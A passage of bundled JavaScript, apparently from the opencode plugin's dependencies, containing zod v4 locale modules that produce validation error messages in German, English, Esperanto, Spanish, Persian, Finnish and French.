    url: "URL",
    emoji: "Emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-Datum und -Uhrzeit",
    date: "ISO-Datum",
    time: "ISO-Uhrzeit",
    duration: "ISO-Dauer",
    ipv4: "IPv4-Adresse",
    ipv6: "IPv6-Adresse",
    cidrv4: "IPv4-Bereich",
    cidrv6: "IPv6-Bereich",
    base64: "Base64-codierter String",
    base64url: "Base64-URL-codierter String",
    json_string: "JSON-String",
    e164: "E.164-Nummer",
    jwt: "JWT",
    template_literal: "Eingabe"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Ung\xFCltige Eingabe: erwartet ${issue3.expected}, erhalten ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Ung\xFCltige Eingabe: erwartet ${stringifyPrimitive2(issue3.values[0])}`;
        return `Ung\xFCltige Option: erwartet eine von ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Zu gro\xDF: erwartet, dass ${issue3.origin ?? "Wert"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "Elemente"} hat`;
        return `Zu gro\xDF: erwartet, dass ${issue3.origin ?? "Wert"} ${adj}${issue3.maximum.toString()} ist`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Zu klein: erwartet, dass ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit} hat`;
        }
        return `Zu klein: erwartet, dass ${issue3.origin} ${adj}${issue3.minimum.toString()} ist`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Ung\xFCltiger String: muss mit "${_issue.prefix}" beginnen`;
        if (_issue.format === "ends_with")
          return `Ung\xFCltiger String: muss mit "${_issue.suffix}" enden`;
        if (_issue.format === "includes")
          return `Ung\xFCltiger String: muss "${_issue.includes}" enthalten`;
        if (_issue.format === "regex")
          return `Ung\xFCltiger String: muss dem Muster ${_issue.pattern} entsprechen`;
        return `Ung\xFCltig: ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ung\xFCltige Zahl: muss ein Vielfaches von ${issue3.divisor} sein`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Unbekannte Schl\xFCssel" : "Unbekannter Schl\xFCssel"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Ung\xFCltiger Schl\xFCssel in ${issue3.origin}`;
      case "invalid_union":
        return "Ung\xFCltige Eingabe";
      case "invalid_element":
        return `Ung\xFCltiger Wert in ${issue3.origin}`;
      default:
        return `Ung\xFCltige Eingabe`;
    }
  };
};
function de_default2() {
  return {
    localeError: error54()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/en.js
var parsedType2 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "number";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error55 = () => {
  const Sizable = {
    string: { unit: "characters", verb: "to have" },
    file: { unit: "bytes", verb: "to have" },
    array: { unit: "items", verb: "to have" },
    set: { unit: "items", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "input",
    email: "email address",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO datetime",
    date: "ISO date",
    time: "ISO time",
    duration: "ISO duration",
    ipv4: "IPv4 address",
    ipv6: "IPv6 address",
    cidrv4: "IPv4 range",
    cidrv6: "IPv6 range",
    base64: "base64-encoded string",
    base64url: "base64url-encoded string",
    json_string: "JSON string",
    e164: "E.164 number",
    jwt: "JWT",
    template_literal: "input"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Invalid input: expected ${issue3.expected}, received ${parsedType2(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Invalid input: expected ${stringifyPrimitive2(issue3.values[0])}`;
        return `Invalid option: expected one of ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Too big: expected ${issue3.origin ?? "value"} to have ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elements"}`;
        return `Too big: expected ${issue3.origin ?? "value"} to be ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Too small: expected ${issue3.origin} to have ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Too small: expected ${issue3.origin} to be ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `Invalid string: must start with "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `Invalid string: must end with "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Invalid string: must include "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Invalid string: must match pattern ${_issue.pattern}`;
        return `Invalid ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Invalid number: must be a multiple of ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Unrecognized key${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Invalid key in ${issue3.origin}`;
      case "invalid_union":
        return "Invalid input";
      case "invalid_element":
        return `Invalid value in ${issue3.origin}`;
      default:
        return `Invalid input`;
    }
  };
};
function en_default2() {
  return {
    localeError: error55()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/eo.js
var parsedType3 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "nombro";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "tabelo";
      }
      if (data === null) {
        return "senvalora";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  return t;
};
var error56 = () => {
  const Sizable = {
    string: { unit: "karaktrojn", verb: "havi" },
    file: { unit: "bajtojn", verb: "havi" },
    array: { unit: "elementojn", verb: "havi" },
    set: { unit: "elementojn", verb: "havi" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "enigo",
    email: "retadreso",
    url: "URL",
    emoji: "emo\u011Dio",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-datotempo",
    date: "ISO-dato",
    time: "ISO-tempo",
    duration: "ISO-da\u016Dro",
    ipv4: "IPv4-adreso",
    ipv6: "IPv6-adreso",
    cidrv4: "IPv4-rango",
    cidrv6: "IPv6-rango",
    base64: "64-ume kodita karaktraro",
    base64url: "URL-64-ume kodita karaktraro",
    json_string: "JSON-karaktraro",
    e164: "E.164-nombro",
    jwt: "JWT",
    template_literal: "enigo"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Nevalida enigo: atendi\u011Dis ${issue3.expected}, ricevi\u011Dis ${parsedType3(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Nevalida enigo: atendi\u011Dis ${stringifyPrimitive2(issue3.values[0])}`;
        return `Nevalida opcio: atendi\u011Dis unu el ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Tro granda: atendi\u011Dis ke ${issue3.origin ?? "valoro"} havu ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementojn"}`;
        return `Tro granda: atendi\u011Dis ke ${issue3.origin ?? "valoro"} havu ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Tro malgranda: atendi\u011Dis ke ${issue3.origin} havu ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Tro malgranda: atendi\u011Dis ke ${issue3.origin} estu ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Nevalida karaktraro: devas komenci\u011Di per "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Nevalida karaktraro: devas fini\u011Di per "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Nevalida karaktraro: devas inkluzivi "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Nevalida karaktraro: devas kongrui kun la modelo ${_issue.pattern}`;
        return `Nevalida ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Nevalida nombro: devas esti oblo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Nekonata${issue3.keys.length > 1 ? "j" : ""} \u015Dlosilo${issue3.keys.length > 1 ? "j" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Nevalida \u015Dlosilo en ${issue3.origin}`;
      case "invalid_union":
        return "Nevalida enigo";
      case "invalid_element":
        return `Nevalida valoro en ${issue3.origin}`;
      default:
        return `Nevalida enigo`;
    }
  };
};
function eo_default2() {
  return {
    localeError: error56()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/es.js
var error57 = () => {
  const Sizable = {
    string: { unit: "caracteres", verb: "tener" },
    file: { unit: "bytes", verb: "tener" },
    array: { unit: "elementos", verb: "tener" },
    set: { unit: "elementos", verb: "tener" }
  };
  const TypeNames = {
    string: "texto",
    number: "n\xFAmero",
    boolean: "booleano",
    array: "arreglo",
    object: "objeto",
    set: "conjunto",
    file: "archivo",
    date: "fecha",
    bigint: "n\xFAmero grande",
    symbol: "s\xEDmbolo",
    undefined: "indefinido",
    null: "nulo",
    function: "funci\xF3n",
    map: "mapa",
    record: "registro",
    tuple: "tupla",
    enum: "enumeraci\xF3n",
    union: "uni\xF3n",
    literal: "literal",
    promise: "promesa",
    void: "vac\xEDo",
    never: "nunca",
    unknown: "desconocido",
    any: "cualquiera"
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  function getTypeName(type) {
    return TypeNames[type] ?? type;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype) {
          return data.constructor.name;
        }
        return "object";
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entrada",
    email: "direcci\xF3n de correo electr\xF3nico",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "fecha y hora ISO",
    date: "fecha ISO",
    time: "hora ISO",
    duration: "duraci\xF3n ISO",
    ipv4: "direcci\xF3n IPv4",
    ipv6: "direcci\xF3n IPv6",
    cidrv4: "rango IPv4",
    cidrv6: "rango IPv6",
    base64: "cadena codificada en base64",
    base64url: "URL codificada en base64",
    json_string: "cadena JSON",
    e164: "n\xFAmero E.164",
    jwt: "JWT",
    template_literal: "entrada"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entrada inv\xE1lida: se esperaba ${getTypeName(issue3.expected)}, recibido ${getTypeName(parsedType4(issue3.input))}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entrada inv\xE1lida: se esperaba ${stringifyPrimitive2(issue3.values[0])}`;
        return `Opci\xF3n inv\xE1lida: se esperaba una de ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing)
          return `Demasiado grande: se esperaba que ${origin ?? "valor"} tuviera ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "elementos"}`;
        return `Demasiado grande: se esperaba que ${origin ?? "valor"} fuera ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        const origin = getTypeName(issue3.origin);
        if (sizing) {
          return `Demasiado peque\xF1o: se esperaba que ${origin} tuviera ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Demasiado peque\xF1o: se esperaba que ${origin} fuera ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Cadena inv\xE1lida: debe comenzar con "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cadena inv\xE1lida: debe terminar en "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cadena inv\xE1lida: debe incluir "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cadena inv\xE1lida: debe coincidir con el patr\xF3n ${_issue.pattern}`;
        return `Inv\xE1lido ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `N\xFAmero inv\xE1lido: debe ser m\xFAltiplo de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Llave${issue3.keys.length > 1 ? "s" : ""} desconocida${issue3.keys.length > 1 ? "s" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Llave inv\xE1lida en ${getTypeName(issue3.origin)}`;
      case "invalid_union":
        return "Entrada inv\xE1lida";
      case "invalid_element":
        return `Valor inv\xE1lido en ${getTypeName(issue3.origin)}`;
      default:
        return `Entrada inv\xE1lida`;
    }
  };
};
function es_default2() {
  return {
    localeError: error57()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fa.js
var error58 = () => {
  const Sizable = {
    string: { unit: "\u06A9\u0627\u0631\u0627\u06A9\u062A\u0631", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    file: { unit: "\u0628\u0627\u06CC\u062A", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    array: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" },
    set: { unit: "\u0622\u06CC\u062A\u0645", verb: "\u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0639\u062F\u062F";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0622\u0631\u0627\u06CC\u0647";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0648\u0631\u0648\u062F\u06CC",
    email: "\u0622\u062F\u0631\u0633 \u0627\u06CC\u0645\u06CC\u0644",
    url: "URL",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u062A\u0627\u0631\u06CC\u062E \u0648 \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    date: "\u062A\u0627\u0631\u06CC\u062E \u0627\u06CC\u0632\u0648",
    time: "\u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    duration: "\u0645\u062F\u062A \u0632\u0645\u0627\u0646 \u0627\u06CC\u0632\u0648",
    ipv4: "IPv4 \u0622\u062F\u0631\u0633",
    ipv6: "IPv6 \u0622\u062F\u0631\u0633",
    cidrv4: "IPv4 \u062F\u0627\u0645\u0646\u0647",
    cidrv6: "IPv6 \u062F\u0627\u0645\u0646\u0647",
    base64: "base64-encoded \u0631\u0634\u062A\u0647",
    base64url: "base64url-encoded \u0631\u0634\u062A\u0647",
    json_string: "JSON \u0631\u0634\u062A\u0647",
    e164: "E.164 \u0639\u062F\u062F",
    jwt: "JWT",
    template_literal: "\u0648\u0631\u0648\u062F\u06CC"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${issue3.expected} \u0645\u06CC\u200C\u0628\u0648\u062F\u060C ${parsedType4(issue3.input)} \u062F\u0631\u06CC\u0627\u0641\u062A \u0634\u062F`;
      case "invalid_value":
        if (issue3.values.length === 1) {
          return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A ${stringifyPrimitive2(issue3.values[0])} \u0645\u06CC\u200C\u0628\u0648\u062F`;
        }
        return `\u06AF\u0632\u06CC\u0646\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0645\u06CC\u200C\u0628\u0627\u06CC\u0633\u062A \u06CC\u06A9\u06CC \u0627\u0632 ${joinValues2(issue3.values, "|")} \u0645\u06CC\u200C\u0628\u0648\u062F`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue3.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0635\u0631"} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u0628\u0632\u0631\u06AF: ${issue3.origin ?? "\u0645\u0642\u062F\u0627\u0631"} \u0628\u0627\u06CC\u062F ${adj}${issue3.maximum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} ${sizing.unit} \u0628\u0627\u0634\u062F`;
        }
        return `\u062E\u06CC\u0644\u06CC \u06A9\u0648\u0686\u06A9: ${issue3.origin} \u0628\u0627\u06CC\u062F ${adj}${issue3.minimum.toString()} \u0628\u0627\u0634\u062F`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.prefix}" \u0634\u0631\u0648\u0639 \u0634\u0648\u062F`;
        }
        if (_issue.format === "ends_with") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 "${_issue.suffix}" \u062A\u0645\u0627\u0645 \u0634\u0648\u062F`;
        }
        if (_issue.format === "includes") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0634\u0627\u0645\u0644 "${_issue.includes}" \u0628\u0627\u0634\u062F`;
        }
        if (_issue.format === "regex") {
          return `\u0631\u0634\u062A\u0647 \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0628\u0627 \u0627\u0644\u06AF\u0648\u06CC ${_issue.pattern} \u0645\u0637\u0627\u0628\u0642\u062A \u062F\u0627\u0634\u062A\u0647 \u0628\u0627\u0634\u062F`;
        }
        return `${Nouns[_issue.format] ?? issue3.format} \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      }
      case "not_multiple_of":
        return `\u0639\u062F\u062F \u0646\u0627\u0645\u0639\u062A\u0628\u0631: \u0628\u0627\u06CC\u062F \u0645\u0636\u0631\u0628 ${issue3.divisor} \u0628\u0627\u0634\u062F`;
      case "unrecognized_keys":
        return `\u06A9\u0644\u06CC\u062F${issue3.keys.length > 1 ? "\u0647\u0627\u06CC" : ""} \u0646\u0627\u0634\u0646\u0627\u0633: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u06A9\u0644\u06CC\u062F \u0646\u0627\u0634\u0646\u0627\u0633 \u062F\u0631 ${issue3.origin}`;
      case "invalid_union":
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
      case "invalid_element":
        return `\u0645\u0642\u062F\u0627\u0631 \u0646\u0627\u0645\u0639\u062A\u0628\u0631 \u062F\u0631 ${issue3.origin}`;
      default:
        return `\u0648\u0631\u0648\u062F\u06CC \u0646\u0627\u0645\u0639\u062A\u0628\u0631`;
    }
  };
};
function fa_default2() {
  return {
    localeError: error58()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fi.js
var error59 = () => {
  const Sizable = {
    string: { unit: "merkki\xE4", subject: "merkkijonon" },
    file: { unit: "tavua", subject: "tiedoston" },
    array: { unit: "alkiota", subject: "listan" },
    set: { unit: "alkiota", subject: "joukon" },
    number: { unit: "", subject: "luvun" },
    bigint: { unit: "", subject: "suuren kokonaisluvun" },
    int: { unit: "", subject: "kokonaisluvun" },
    date: { unit: "", subject: "p\xE4iv\xE4m\xE4\xE4r\xE4n" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "s\xE4\xE4nn\xF6llinen lauseke",
    email: "s\xE4hk\xF6postiosoite",
    url: "URL-osoite",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO-aikaleima",
    date: "ISO-p\xE4iv\xE4m\xE4\xE4r\xE4",
    time: "ISO-aika",
    duration: "ISO-kesto",
    ipv4: "IPv4-osoite",
    ipv6: "IPv6-osoite",
    cidrv4: "IPv4-alue",
    cidrv6: "IPv6-alue",
    base64: "base64-koodattu merkkijono",
    base64url: "base64url-koodattu merkkijono",
    json_string: "JSON-merkkijono",
    e164: "E.164-luku",
    jwt: "JWT",
    template_literal: "templaattimerkkijono"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Virheellinen tyyppi: odotettiin ${issue3.expected}, oli ${parsedType4(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Virheellinen sy\xF6te: t\xE4ytyy olla ${stringifyPrimitive2(issue3.values[0])}`;
        return `Virheellinen valinta: t\xE4ytyy olla yksi seuraavista: ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Liian suuri: ${sizing.subject} t\xE4ytyy olla ${adj}${issue3.maximum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian suuri: arvon t\xE4ytyy olla ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Liian pieni: ${sizing.subject} t\xE4ytyy olla ${adj}${issue3.minimum.toString()} ${sizing.unit}`.trim();
        }
        return `Liian pieni: arvon t\xE4ytyy olla ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy alkaa "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Virheellinen sy\xF6te: t\xE4ytyy loppua "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Virheellinen sy\xF6te: t\xE4ytyy sis\xE4lt\xE4\xE4 "${_issue.includes}"`;
        if (_issue.format === "regex") {
          return `Virheellinen sy\xF6te: t\xE4ytyy vastata s\xE4\xE4nn\xF6llist\xE4 lauseketta ${_issue.pattern}`;
        }
        return `Virheellinen ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Virheellinen luku: t\xE4ytyy olla luvun ${issue3.divisor} monikerta`;
      case "unrecognized_keys":
        return `${issue3.keys.length > 1 ? "Tuntemattomat avaimet" : "Tuntematon avain"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return "Virheellinen avain tietueessa";
      case "invalid_union":
        return "Virheellinen unioni";
      case "invalid_element":
        return "Virheellinen arvo joukossa";
      default:
        return `Virheellinen sy\xF6te`;
    }
  };
};
function fi_default2() {
  return {
    localeError: error59()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/fr.js
var error60 = () => {
  const Sizable = {
    string: { unit: "caract\xE8res", verb: "avoir" },
    file: { unit: "octets", verb: "avoir" },
    array: { unit: "\xE9l\xE9ments", verb: "avoir" },
    set: { unit: "\xE9l\xE9ments", verb: "avoir" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType4 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "nombre";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "tableau";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "entr\xE9e",
    email: "adresse e-mail",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "date et heure ISO",
    date: "date ISO",
    time: "heure ISO",
    duration: "dur\xE9e ISO",
    ipv4: "adresse IPv4",
    ipv6: "adresse IPv6",
    cidrv4: "plage IPv4",
    cidrv6: "plage IPv6",
    base64: "cha\xEEne encod\xE9e en base64",
    base64url: "cha\xEEne encod\xE9e en base64url",
    json_string: "cha\xEEne JSON",
    e164: "num\xE9ro E.164",
    jwt: "JWT",
    template_literal: "entr\xE9e"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `Entr\xE9e invalide : ${issue3.expected} attendu, ${parsedType4(issue3.input)} re\xE7u`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `Entr\xE9e invalide : ${stringifyPrimitive2(issue3.values[0])} attendu`;
        return `Option invalide : une valeur parmi ${joinValues2(issue3.values, "|")} attendue`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Trop grand : ${issue3.origin ?? "valeur"} doit ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\xE9l\xE9ment(s)"}`;
        return `Trop grand : ${issue3.origin ?? "valeur"} doit \xEAtre ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Trop petit : ${issue3.origin} doit ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Trop petit : ${issue3.origin} doit \xEAtre ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Cha\xEEne invalide : doit commencer par "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Cha\xEEne invalide : doit se terminer par "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Cha\xEEne invalide : doit inclure "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Cha\xEEne invalide : doit correspondre au mod\xE8le ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} invalide`;
      }
      case "not_multiple_of":
        return `Nombre invalide : doit \xEAtre un multiple de ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Cl\xE9${issue3.keys.length > 1 ? "s" : ""} non reconnue${issue3.keys.length > 1 ? "s" : ""} : ${joinValues2(issue3.keys, ", ")}`;
